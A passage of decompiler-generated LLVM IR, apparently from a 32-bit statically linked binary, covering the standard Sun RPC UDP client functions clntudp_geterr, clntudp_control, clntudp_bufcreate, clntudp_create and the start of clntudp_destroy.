  uselistorder i32 %arg3, { 6, 5, 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055360, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8055320, { 1, 0 }
  uselistorder label %dec_label_pc_8055275, { 1, 0 }
  uselistorder label %dec_label_pc_8055238, { 1, 0 }
  uselistorder label %dec_label_pc_805521f, { 1, 0 }
  uselistorder label %dec_label_pc_80551d2, { 1, 0 }
  uselistorder label %dec_label_pc_80551af, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805536f = add i32 %arg1, 8
  %v2_805536f = inttoptr i32 %v1_805536f to i32*
  %v3_805536f = load i32, i32* %v2_805536f, align 4
  %v1_8055374 = add i32 %v3_805536f, 44
  %v3_805537c = inttoptr i32 %arg2 to i16*
  %v4_805537c = call i32 @memcpy(i16* %v3_805537c, i32 %v1_8055374, i32 12)
  ret i32 %v4_805537c
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8055391 = add i32 %arg1, 8
  %v2_8055391 = inttoptr i32 %v1_8055391 to i32*
  %v3_8055391 = load i32, i32* %v2_8055391, align 4
  %v1_8055394 = add i32 %v3_8055391, 56
  %v1_8055397 = inttoptr i32 %v1_8055394 to i32*
  store i32 2, i32* %v1_8055397, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_8055394
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_80553a7 = load i32, i32* @eax, align 4
  ret i32 %v0_80553a7
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg3 to i32
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  %v1_80553b4 = add i32 %arg1, 8
  %v2_80553b4 = inttoptr i32 %v1_80553b4 to i32*
  %v3_80553b4 = load i32, i32* %v2_80553b4, align 4
  store i32 %v3_80553b4, i32* %ecx.global-to-local, align 4
  switch i32 %arg2, label %dec_label_pc_80553c8 [
    i32 1, label %dec_label_pc_80553e7
    i32 2, label %dec_label_pc_80553f4
    i32 3, label %dec_label_pc_8055416
    i32 4, label %dec_label_pc_80553fc
    i32 5, label %dec_label_pc_8055409
    i32 6, label %dec_label_pc_805542d
    i32 8, label %dec_label_pc_80553cf
    i32 9, label %dec_label_pc_80553db
    i32 10, label %dec_label_pc_8055431
    i32 11, label %dec_label_pc_805543a
    i32 12, label %dec_label_pc_8055444
    i32 13, label %dec_label_pc_805544e
    i32 14, label %dec_label_pc_805545a
    i32 15, label %dec_label_pc_8055466
  ]

dec_label_pc_80553c8:                             ; preds = %entry
  br label %dec_label_pc_8055475

dec_label_pc_80553cf:                             ; preds = %entry
  %v1_80553cf = add i32 %v3_80553b4, 4
  %v2_80553cf = inttoptr i32 %v1_80553cf to i32*
  store i32 1, i32* %v2_80553cf, align 4
  br label %dec_label_pc_8055470

dec_label_pc_80553db:                             ; preds = %entry
  %v1_80553db = add i32 %v3_80553b4, 4
  %v2_80553db = inttoptr i32 %v1_80553db to i32*
  store i32 0, i32* %v2_80553db, align 4
  br label %dec_label_pc_8055470

dec_label_pc_80553e7:                             ; preds = %entry
  %v2_80553e7 = load i32, i32* %arg3, align 4
  store i32 %v2_80553e7, i32* %edx.global-to-local, align 4
  %v1_80553e9 = add i32 %tmp7, 4
  %v2_80553e9 = inttoptr i32 %v1_80553e9 to i32*
  %v3_80553e9 = load i32, i32* %v2_80553e9, align 4
  %v2_80553ec = add i32 %v3_80553b4, 40
  %v3_80553ec = inttoptr i32 %v2_80553ec to i32*
  store i32 %v3_80553e9, i32* %v3_80553ec, align 4
  %v0_80553ef = load i32, i32* %edx.global-to-local, align 4
  %v1_80553ef = load i32, i32* %ecx.global-to-local, align 4
  %v2_80553ef = add i32 %v1_80553ef, 36
  %v3_80553ef = inttoptr i32 %v2_80553ef to i32*
  store i32 %v0_80553ef, i32* %v3_80553ef, align 4
  br label %dec_label_pc_8055470

dec_label_pc_80553f4:                             ; preds = %entry
  %v1_80553f4 = add i32 %v3_80553b4, 36
  %v2_80553f4 = inttoptr i32 %v1_80553f4 to i32*
  %v3_80553f4 = load i32, i32* %v2_80553f4, align 4
  store i32 %v3_80553f4, i32* %edx.global-to-local, align 4
  %v1_80553f7 = add i32 %v3_80553b4, 40
  br label %dec_label_pc_805540f

dec_label_pc_80553fc:                             ; preds = %entry
  %v2_80553fc = load i32, i32* %arg3, align 4
  store i32 %v2_80553fc, i32* %edx.global-to-local, align 4
  %v1_80553fe = add i32 %tmp7, 4
  %v2_80553fe = inttoptr i32 %v1_80553fe to i32*
  %v3_80553fe = load i32, i32* %v2_80553fe, align 4
  %v2_8055401 = add i32 %v3_80553b4, 32
  %v3_8055401 = inttoptr i32 %v2_8055401 to i32*
  store i32 %v3_80553fe, i32* %v3_8055401, align 4
  %v0_8055404 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055404 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8055404 = add i32 %v1_8055404, 28
  %v3_8055404 = inttoptr i32 %v2_8055404 to i32*
  store i32 %v0_8055404, i32* %v3_8055404, align 4
  br label %dec_label_pc_8055470

dec_label_pc_8055409:                             ; preds = %entry
  %v1_8055409 = add i32 %v3_80553b4, 28
  %v2_8055409 = inttoptr i32 %v1_8055409 to i32*
  %v3_8055409 = load i32, i32* %v2_8055409, align 4
  store i32 %v3_8055409, i32* %edx.global-to-local, align 4
  %v1_805540c = add i32 %v3_80553b4, 32
  br label %dec_label_pc_805540f

dec_label_pc_805540f:                             ; preds = %dec_label_pc_80553f4, %dec_label_pc_8055409
  %storemerge.in.in = phi i32 [ %v1_805540c, %dec_label_pc_8055409 ], [ %v1_80553f7, %dec_label_pc_80553f4 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_805540f = add i32 %tmp7, 4
  %v3_805540f = inttoptr i32 %v2_805540f to i32*
  store i32 %storemerge, i32* %v3_805540f, align 4
  %v0_8055412 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055412 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055412 = inttoptr i32 %v1_8055412 to i32*
  store i32 %v0_8055412, i32* %v2_8055412, align 4
  br label %dec_label_pc_8055470

dec_label_pc_8055416:                             ; preds = %entry
  %v1_8055416 = add i32 %v3_80553b4, 8
  %v3_805541e = bitcast i32* %arg3 to i16*
  %v4_805541e = call i32 @memcpy(i16* %v3_805541e, i32 %v1_8055416, i32 16)
  br label %dec_label_pc_8055475

dec_label_pc_805542d:                             ; preds = %entry
  %v1_805542d = inttoptr i32 %v3_80553b4 to i32*
  %v2_805542d = load i32, i32* %v1_805542d, align 4
  br label %dec_label_pc_8055462

dec_label_pc_8055431:                             ; preds = %entry
  %v1_8055431 = add i32 %v3_80553b4, 88
  %v2_8055431 = inttoptr i32 %v1_8055431 to i32*
  %v3_8055431 = load i32, i32* %v2_8055431, align 4
  %v1_8055434 = inttoptr i32 %v3_8055431 to i32*
  %v2_8055434 = load i32, i32* %v1_8055434, align 4
  %v1_8055436 = call i32 @llvm.bswap.i32(i32 %v2_8055434)
  br label %dec_label_pc_8055462

dec_label_pc_805543a:                             ; preds = %entry
  %v1_805543a = add i32 %v3_80553b4, 88
  %v2_805543a = inttoptr i32 %v1_805543a to i32*
  %v3_805543a = load i32, i32* %v2_805543a, align 4
  store i32 %v3_805543a, i32* %edx.global-to-local, align 4
  %v2_805543d = load i32, i32* %arg3, align 4
  %v1_805543f = add i32 %v2_805543d, -1
  %v1_8055440 = call i32 @llvm.bswap.i32(i32 %v1_805543f)
  %v2_8055442 = inttoptr i32 %v3_805543a to i32*
  store i32 %v1_8055440, i32* %v2_8055442, align 4
  %v0_8055444.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055462.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055444

dec_label_pc_8055444:                             ; preds = %entry, %dec_label_pc_805543a
  %v1_8055462.pre = phi i32 [ %tmp7, %entry ], [ %v1_8055462.pre.pre, %dec_label_pc_805543a ]
  %v0_8055444 = phi i32 [ %v3_80553b4, %entry ], [ %v0_8055444.pre, %dec_label_pc_805543a ]
  %v1_8055444 = add i32 %v0_8055444, 88
  %v2_8055444 = inttoptr i32 %v1_8055444 to i32*
  %v3_8055444 = load i32, i32* %v2_8055444, align 4
  %v1_8055447 = add i32 %v3_8055444, 16
  %v2_8055447 = inttoptr i32 %v1_8055447 to i32*
  %v3_8055447 = load i32, i32* %v2_8055447, align 4
  %v1_805544a = call i32 @llvm.bswap.i32(i32 %v3_8055447)
  br label %dec_label_pc_8055462

dec_label_pc_805544e:                             ; preds = %entry
  %v1_805544e = add i32 %v3_80553b4, 88
  %v2_805544e = inttoptr i32 %v1_805544e to i32*
  %v3_805544e = load i32, i32* %v2_805544e, align 4
  store i32 %v3_805544e, i32* %edx.global-to-local, align 4
  %v2_8055451 = load i32, i32* %arg3, align 4
  %v1_8055453 = call i32 @llvm.bswap.i32(i32 %v2_8055451)
  %v2_8055455 = add i32 %v3_805544e, 16
  %v3_8055455 = inttoptr i32 %v2_8055455 to i32*
  store i32 %v1_8055453, i32* %v3_8055455, align 4
  br label %dec_label_pc_8055470

dec_label_pc_805545a:                             ; preds = %entry
  %v1_805545a = add i32 %v3_80553b4, 88
  %v2_805545a = inttoptr i32 %v1_805545a to i32*
  %v3_805545a = load i32, i32* %v2_805545a, align 4
  %v1_805545d = add i32 %v3_805545a, 12
  %v2_805545d = inttoptr i32 %v1_805545d to i32*
  %v3_805545d = load i32, i32* %v2_805545d, align 4
  %v1_8055460 = call i32 @llvm.bswap.i32(i32 %v3_805545d)
  br label %dec_label_pc_8055462

dec_label_pc_8055462:                             ; preds = %dec_label_pc_8055444, %dec_label_pc_8055431, %dec_label_pc_805542d, %dec_label_pc_805545a
  %v1_8055462 = phi i32 [ %v1_8055462.pre, %dec_label_pc_8055444 ], [ %tmp7, %dec_label_pc_8055431 ], [ %tmp7, %dec_label_pc_805542d ], [ %tmp7, %dec_label_pc_805545a ]
  %v0_8055462 = phi i32 [ %v1_805544a, %dec_label_pc_8055444 ], [ %v1_8055436, %dec_label_pc_8055431 ], [ %v2_805542d, %dec_label_pc_805542d ], [ %v1_8055460, %dec_label_pc_805545a ]
  %v2_8055462 = inttoptr i32 %v1_8055462 to i32*
  store i32 %v0_8055462, i32* %v2_8055462, align 4
  br label %dec_label_pc_8055470

dec_label_pc_8055466:                             ; preds = %entry
  %v1_8055466 = add i32 %v3_80553b4, 88
  %v2_8055466 = inttoptr i32 %v1_8055466 to i32*
  %v3_8055466 = load i32, i32* %v2_8055466, align 4
  store i32 %v3_8055466, i32* %edx.global-to-local, align 4
  %v2_8055469 = load i32, i32* %arg3, align 4
  %v1_805546b = call i32 @llvm.bswap.i32(i32 %v2_8055469)
  %v2_805546d = add i32 %v3_8055466, 12
  %v3_805546d = inttoptr i32 %v2_805546d to i32*
  store i32 %v1_805546b, i32* %v3_805546d, align 4
  br label %dec_label_pc_8055470

dec_label_pc_8055470:                             ; preds = %dec_label_pc_805544e, %dec_label_pc_8055462, %dec_label_pc_80553fc, %dec_label_pc_805540f, %dec_label_pc_80553e7, %dec_label_pc_80553db, %dec_label_pc_80553cf, %dec_label_pc_8055466
  br label %dec_label_pc_8055475

dec_label_pc_8055475:                             ; preds = %dec_label_pc_8055416, %dec_label_pc_80553c8, %dec_label_pc_8055470
  %v0_8055478 = phi i32 [ 1, %dec_label_pc_8055416 ], [ 0, %dec_label_pc_80553c8 ], [ 1, %dec_label_pc_8055470 ]
  %v2_8055475 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055475, i32* %edx.global-to-local, align 4
  ret i32 %v0_8055478

; uselistorder directives
  uselistorder i32 %v3_80553b4, { 15, 14, 13, 11, 12, 10, 7, 3, 6, 5, 4, 2, 1, 0, 9, 8, 16 }
  uselistorder i32 %tmp7, { 4, 5, 6, 0, 2, 3, 1, 7 }
  uselistorder i32* %edx.global-to-local, { 10, 0, 1, 2, 6, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg3, { 5, 4, 3, 1, 2, 0, 6 }
  uselistorder label %dec_label_pc_8055475, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055470, { 7, 1, 0, 3, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_8055462, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055444, { 1, 0 }
  uselistorder label %dec_label_pc_805540f, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg5 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805547a = load i32, i32* @edi, align 4
  %v0_805547b = load i32, i32* @esi, align 4
  %v0_805547c = load i32, i32* @ebx, align 4
  store i32 %v0_805547c, i32* %stack_var_-16, align 4
  %v2_8055482 = call i32 @malloc(i32 12)
  %v1_8055495 = add i32 %arg6, 3
  %v1_8055498 = add i32 %arg7, 3
  %v1_805549b = and i32 %v1_8055495, -4
  store i32 %v1_805549b, i32* @edi, align 4
  %v1_805549e = and i32 %v1_8055498, -4
  store i32 %v1_805549e, i32* @ebx, align 4
  store i32 %v2_8055482, i32* @ebp, align 4
  %v2_80554a3 = add i32 %v1_805549b, 100
  %v3_80554a3 = add i32 %v2_80554a3, %v1_805549e
  store i32 %v3_80554a3, i32* %eax.global-to-local, align 4
  %v2_80554aa = call i32 @malloc(i32 %v3_80554a3)
  store i32 %v2_80554aa, i32* %eax.global-to-local, align 4
  store i32 %v2_80554aa, i32* @esi, align 4
  %v0_80554b4 = load i32, i32* @ebp, align 4
  %v1_80554b4 = icmp eq i32 %v0_80554b4, 0
  br i1 %v1_80554b4, label %dec_label_pc_80554bc, label %dec_label_pc_80554b8

dec_label_pc_80554b8:                             ; preds = %entry
  %v1_80554b8 = icmp eq i32 %v2_80554aa, 0
  %v1_80554ba = icmp eq i1 %v1_80554b8, false
  br i1 %v1_80554ba, label %dec_label_pc_80554ea, label %dec_label_pc_80554bc

dec_label_pc_80554bc:                             ; preds = %entry, %dec_label_pc_80554b8
  %v0_80554bc = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80554bc, i32* %eax.global-to-local, align 4
  %v0_80554c3 = load i32, i32* inttoptr (i32 134621136 to i32*), align 16
  store i32 %v0_80554bc, i32* @ebx, align 4
  %v3_80554d0 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_805caf8.297 to i32), i32 %v0_80554c3)
  store i32 %v3_80554d0, i32* %eax.global-to-local, align 4
  %v0_80554d8 = load i32, i32* @ebx, align 4
  %v1_80554d8 = inttoptr i32 %v0_80554d8 to i32*
  store i32 12, i32* %v1_80554d8, align 4
  %v0_80554de = load i32, i32* @ebx, align 4
  %v1_80554de = add i32 %v0_80554de, 8
  %v2_80554de = inttoptr i32 %v1_80554de to i32*
  store i32 12, i32* %v2_80554de, align 4
  br label %dec_label_pc_8055685

dec_label_pc_80554ea:                             ; preds = %dec_label_pc_80554b8
  %v1_80554ea = load i32, i32* @ebx, align 4
  %v2_80554ea = add i32 %v2_80554aa, 96
  %v3_80554ea = add i32 %v2_80554ea, %v1_80554ea
  %v2_80554ee = add i32 %v2_80554aa, 88
  %v3_80554ee = inttoptr i32 %v2_80554ee to i32*
  store i32 %v3_80554ea, i32* %v3_80554ee, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_80554f5 = add i32 %arg1, 2
  %v2_80554f5 = inttoptr i32 %v1_80554f5 to i16*
  %v3_80554f5 = load i16, i16* %v2_80554f5, align 2
  %v4_80554f5 = icmp eq i16 %v3_80554f5, 0
  %v1_80554fa = icmp eq i1 %v4_80554f5, false
  br i1 %v1_80554fa, label %dec_label_pc_8055524, label %dec_label_pc_80554fc

dec_label_pc_80554fc:                             ; preds = %dec_label_pc_80554ea
  %v5_8055507 = call i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 17)
  store i32 %v5_8055507, i32* %eax.global-to-local, align 4
  %v3_805550f = trunc i32 %v5_8055507 to i16
  %v4_805550f = icmp eq i16 %v3_805550f, 0
  br i1 %v4_805550f, label %dec_label_pc_8055685, label %dec_label_pc_8055518

dec_label_pc_8055518:                             ; preds = %dec_label_pc_80554fc
  %v2_805551c = call i16 @llvm.bswap.i16(i16 %v3_805550f)
  %v3_805551c = zext i16 %v2_805551c to i32
  %v5_805551c = and i32 %v5_8055507, -65536
  %v6_805551c = or i32 %v3_805551c, %v5_805551c
  store i32 %v6_805551c, i32* %eax.global-to-local, align 4
  store i16 %v2_805551c, i16* %v2_80554f5, align 2
  br label %dec_label_pc_8055524

dec_label_pc_8055524:                             ; preds = %dec_label_pc_80554ea, %dec_label_pc_8055518
  %v0_8055524 = load i32, i32* @ebp, align 4
  %v1_8055524 = add i32 %v0_8055524, 4
  %v2_8055524 = inttoptr i32 %v1_8055524 to i32*
  store i32 ptrtoint (i32* @global_var_8062a2c.298 to i32), i32* %v2_8055524, align 4
  %v1_805552b = load i32, i32* @ebp, align 4
  %v2_805552b = add i32 %v1_805552b, 8
  %v3_805552b = inttoptr i32 %v2_805552b to i32*
  store i32 %v2_80554aa, i32* %v3_805552b, align 4
  %v1_8055535 = add i32 %v2_80554aa, 8
  store i32 %v1_8055535, i32* %eax.global-to-local, align 4
  %tmp36 = inttoptr i32 %v1_8055535 to i16*
  %v5_8055539 = call i32 @memcpy(i16* %tmp36, i32 %arg1, i32 16)
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_8055549 = add i32 %v2_80554aa, 28
  %v3_8055549 = inttoptr i32 %v2_8055549 to i32*
  store i32 %arg4, i32* %v3_8055549, align 4
  %v0_805554c = load i32, i32* @ebx, align 4
  %v2_805554c = add i32 %v2_80554aa, 92
  %v3_805554c = inttoptr i32 %v2_805554c to i32*
  store i32 %v0_805554c, i32* %v3_805554c, align 4
  %v1_805554f = add i32 %v2_80554aa, 24
  %v2_805554f = inttoptr i32 %v1_805554f to i32*
  store i32 16, i32* %v2_805554f, align 4
  %v0_8055556 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055556 = add i32 %v2_80554aa, 32
  %v3_8055556 = inttoptr i32 %v2_8055556 to i32*
  store i32 %v0_8055556, i32* %v3_8055556, align 4
  %v1_8055559 = add i32 %v2_80554aa, 36
  %v2_8055559 = inttoptr i32 %v1_8055559 to i32*
  store i32 -1, i32* %v2_8055559, align 4
  %v1_8055560 = add i32 %v2_80554aa, 40
  %v2_8055560 = inttoptr i32 %v1_8055560 to i32*
  store i32 -1, i32* %v2_8055560, align 4
  %v0_8055567 = load i32, i32* @edi, align 4
  %v2_8055567 = add i32 %v2_80554aa, 84
  %v3_8055567 = inttoptr i32 %v2_8055567 to i32*
  store i32 %v0_8055567, i32* %v3_8055567, align 4
  %v0_805556a = call i32 @_create_xid()
  store i32 %v0_805556a, i32* %stack_var_-72, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-112, align 4
  %v0_8055595 = load i32, i32* @edi, align 4
  %v1_8055596 = add i32 %v2_80554aa, 56
  store i32 %v1_8055596, i32* @ebx, align 4
  %v3_8055599 = load i32, i32* %v3_80554ee, align 4
  %v4_805559d = inttoptr i32 %v1_8055596 to i32*
  %v5_805559d = call i32 @__GI_xdrmem_create(i32* %v4_805559d, i32 %v3_8055599, i32 %v0_8055595, i32 0)
  %v2_80555a5 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80555a5, i32* @eax, align 4
  %v0_80555aa = load i32, i32* @ebx, align 4
  %tmp37 = inttoptr i32 %v0_80555aa to i32*
  %v4_80555ab = call i32 @__GI_xdr_callhdr(i32* %tmp37, i32 %v2_80555a5)
  store i32 %v4_80555ab, i32* %eax.global-to-local, align 4
  %v1_80555b3 = icmp eq i32 %v4_80555ab, 0
  br i1 %v1_80555b3, label %dec_label_pc_8055685, label %dec_label_pc_80555bb

dec_label_pc_80555bb:                             ; preds = %dec_label_pc_8055524
  %v1_80555be = add i32 %v2_80554aa, 60
  %v2_80555be = inttoptr i32 %v1_80555be to i32*
  %v3_80555be = load i32, i32* %v2_80555be, align 4
  store i32 %v3_80555be, i32* %eax.global-to-local, align 4
  store i32 134567365, i32* %stack_var_-112, align 4
  %v5_80555c2 = add i32 %v3_80555be, 16
  %v6_80555c2 = inttoptr i32 %v5_80555c2 to i32*
  %v7_80555c2 = load i32, i32* %v6_80555c2, align 4
  call void @__pseudo_call(i32 %v7_80555c2)
  %v0_80555c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80555c8 = add i32 %v2_80554aa, 80
  %v3_80555c8 = inttoptr i32 %v2_80555c8 to i32*
  store i32 %v0_80555c8, i32* %v3_80555c8, align 4
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_80555cf = load i32, i32* %arg5, align 4
  %v4_80555cf = icmp slt i32 %v2_80555cf, 0
  %v1_80555d2 = icmp eq i1 %v4_80555cf, false
  br i1 %v1_80555d2, label %dec_label_pc_805566c, label %dec_label_pc_80555d8

dec_label_pc_80555d8:                             ; preds = %dec_label_pc_80555bb
  store i32 1, i32* %stack_var_-24, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v4_80555e7 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_80555e7, i32* %eax.global-to-local, align 4
  %v2_80555f6 = icmp slt i32 %v4_80555e7, 0
  store i32 %v4_80555e7, i32* %arg5, align 4
  %v1_80555fa = icmp eq i1 %v2_80555f6, false
  br i1 %v1_80555fa, label %dec_label_pc_8055615, label %dec_label_pc_80555fc

dec_label_pc_80555fc:                             ; preds = %dec_label_pc_80555d8
  %v0_80555fc = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80555fc, i32* %eax.global-to-local, align 4
  store i32 %v0_80555fc, i32* @ebx, align 4
  %v1_8055603 = inttoptr i32 %v0_80555fc to i32*
  store i32 12, i32* %v1_8055603, align 4
  %v0_8055609 = load i32, i32* %stack_var_-112, align 4
  %v1_8055609 = call i32 @__errno_location(i32 %v0_8055609)
  store i32 %v1_8055609, i32* %eax.global-to-local, align 4
  %v1_805560e = inttoptr i32 %v1_8055609 to i32*
  %v2_805560e = load i32, i32* %v1_805560e, align 4
  store i32 %v2_805560e, i32* %eax.global-to-local, align 4
  %v1_8055610 = load i32, i32* @ebx, align 4
  %v2_8055610 = add i32 %v1_8055610, 8
  %v3_8055610 = inttoptr i32 %v2_8055610 to i32*
  store i32 %v2_805560e, i32* %v3_8055610, align 4
  br label %dec_label_pc_8055685

dec_label_pc_8055615:                             ; preds = %dec_label_pc_80555d8
  %v0_8055615 = load i32, i32* @ecx, align 4
  store i32 %v4_80555e7, i32* %stack_var_-112, align 4
  %v6_805561a = call i32 @__GI_bindresvport(i32 %v4_80555e7, i16* null, i32 %v0_8055615, i32 %v0_8055615)
  %v2_805561f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v2_8055633 = load i32, i32* %arg5, align 4
  store i32 %v2_8055633, i32* %stack_var_-112, align 4
  %v4_8055635 = call i32 @ioctl(i32 %v2_8055633, i32 21537, i32 %v2_805561f)
  %v2_805563a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805563a, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-112, align 4
  %v2_8055659 = load i32, i32* %arg5, align 4
  %v5_805565b = call i32 @__GI_setsockopt(i32 %v2_8055659, i32 0, i32 11, i32 %v2_805563a, i32 4)
  store i32 %v5_805565b, i32* %eax.global-to-local, align 4
  %v1_8055663 = add i32 %v2_80554aa, 4
  %v2_8055663 = inttoptr i32 %v1_8055663 to i32*
  store i32 1, i32* %v2_8055663, align 4
  br label %dec_label_pc_8055673

dec_label_pc_805566c:                             ; preds = %dec_label_pc_80555bb
  %v1_805566c = add i32 %v2_80554aa, 4
  %v2_805566c = inttoptr i32 %v1_805566c to i32*
  store i32 0, i32* %v2_805566c, align 4
  br label %dec_label_pc_8055673

dec_label_pc_8055673:                             ; preds = %dec_label_pc_8055615, %dec_label_pc_805566c
  %v2_8055677 = load i32, i32* %arg5, align 4
  store i32 %v2_8055677, i32* %eax.global-to-local, align 4
  %v2_8055679 = inttoptr i32 %v2_80554aa to i32*
  store i32 %v2_8055677, i32* %v2_8055679, align 4
  %v0_805567b = call i32 @authnone_create()
  store i32 %v0_805567b, i32* %eax.global-to-local, align 4
  %v1_8055680 = load i32, i32* @ebp, align 4
  %v2_8055680 = inttoptr i32 %v1_8055680 to i32*
  store i32 %v0_805567b, i32* %v2_8055680, align 4
  br label %dec_label_pc_80556a7

dec_label_pc_8055685:                             ; preds = %dec_label_pc_8055524, %dec_label_pc_80554fc, %dec_label_pc_80555fc, %dec_label_pc_80554bc
  %v1_8055685 = icmp eq i32 %v2_80554aa, 0
  br i1 %v1_8055685, label %dec_label_pc_8055695, label %dec_label_pc_8055689

dec_label_pc_8055689:                             ; preds = %dec_label_pc_8055685
  %v2_805568d = call i32 @free(i32 %v2_80554aa)
  store i32 %v2_805568d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055695

dec_label_pc_8055695:                             ; preds = %dec_label_pc_8055685, %dec_label_pc_8055689
  %v0_8055695 = load i32, i32* @ebp, align 4
  %v1_8055695 = icmp eq i32 %v0_8055695, 0
  br i1 %v1_8055695, label %dec_label_pc_80556a7, label %dec_label_pc_8055699

dec_label_pc_8055699:                             ; preds = %dec_label_pc_8055695
  store i32 0, i32* @ebp, align 4
  %v2_805569f = call i32 @free(i32 %v0_8055695)
  store i32 %v2_805569f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80556a7

dec_label_pc_80556a7:                             ; preds = %dec_label_pc_8055695, %dec_label_pc_8055673, %dec_label_pc_8055699
  %v0_80556aa = load i32, i32* @ebp, align 4
  store i32 %v0_80556aa, i32* %eax.global-to-local, align 4
  %v2_80556ad = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80556ad, i32* @esi, align 4
  store i32 %v0_805547b, i32* @edi, align 4
  store i32 %v0_805547a, i32* @ebp, align 4
  ret i32 %v0_80556aa

; uselistorder directives
  uselistorder i32 %v4_80555e7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_80554aa, { 0, 5, 2, 15, 8, 7, 1, 17, 10, 16, 12, 14, 6, 13, 4, 11, 3, 9, 20, 18, 19, 21 }
  uselistorder i32* %stack_var_-112, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 3, 2, 1 }
  uselistorder i32 21537, { 0, 2, 1 }
  uselistorder i32* %arg5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80556a7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055695, { 1, 0 }
  uselistorder label %dec_label_pc_8055685, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8055673, { 1, 0 }
  uselistorder label %dec_label_pc_8055524, { 1, 0 }
  uselistorder label %dec_label_pc_80554bc, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v8_80556d6 = inttoptr i32 %arg5 to i32*
  %v9_80556d6 = call i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %v8_80556d6, i32 %arg6, i32 8800, i32 8800)
  ret i32 %v9_80556d6
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80556df = load i32, i32* @esi, align 4
  %v0_80556e0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80556e8 = add i32 %arg1, 8
  %v2_80556e8 = inttoptr i32 %v1_80556e8 to i32*
  %v3_80556e8 = load i32, i32* %v2_80556e8, align 4
  store i32 %v3_80556e8, i32* @ebx, align 4
  %v1_80556eb = add i32 %v3_80556e8, 4
  %v2_80556eb = inttoptr i32 %v1_80556eb to i32*
  %v3_80556eb = load i32, i32* %v2_80556eb, align 4
  %v4_80556eb = icmp eq i32 %v3_80556eb, 0
  br i1 %v4_80556eb, label %dec_label_pc_80556fe, label %dec_label_pc_80556f1

dec_label_pc_80556f1:                             ; preds = %entry
